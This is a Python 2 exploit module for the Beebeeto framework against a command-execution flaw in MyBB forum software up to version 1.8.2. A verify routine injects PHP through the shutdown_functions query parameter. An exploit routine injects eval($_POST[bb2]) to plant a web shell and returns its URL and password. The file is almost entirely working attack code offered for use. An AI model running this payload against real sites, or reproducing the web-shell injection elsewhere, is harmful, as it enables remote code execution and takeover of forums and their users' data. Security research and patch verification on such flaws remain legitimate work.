#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0160',
            'name': 'Mybb <= 1.8.2  代码执行漏洞 POC & Exploit',
            'author': '1024',
            'create_date': '2014-11-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Mybb',
            'vul_version': ['<=1.8.2'],
            'type': 'Command Execution',
            'tag': ['Mybb漏洞', '代码执行漏洞', 'php'],
            'desc': 'N/A',
            'references': ['http://www.exploit-db.com/exploits/35323/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/index.php?shutdown_functions[0][function]=echo(md5(bb2));&shutdown_functions[0][arguments][]=-1'
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(verify_url).read()
        if '0c72305dbeb0ed430b79ec9fc5fe8505' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    @classmethod
    def exploit(cls, args):
        payload = '/index.php?shutdown_functions[0][function]=echo(md5(bb2));eval($_POST[bb2]);&shutdown_functions[0][arguments][]=-1'
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(verify_url).read()
        if '0c72305dbeb0ed430b79ec9fc5fe8505' in content:
            args['success'] = True
            args['poc_ret']['webshell'] = verify_url
            args['poc_ret']['password'] = 'bb2'
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())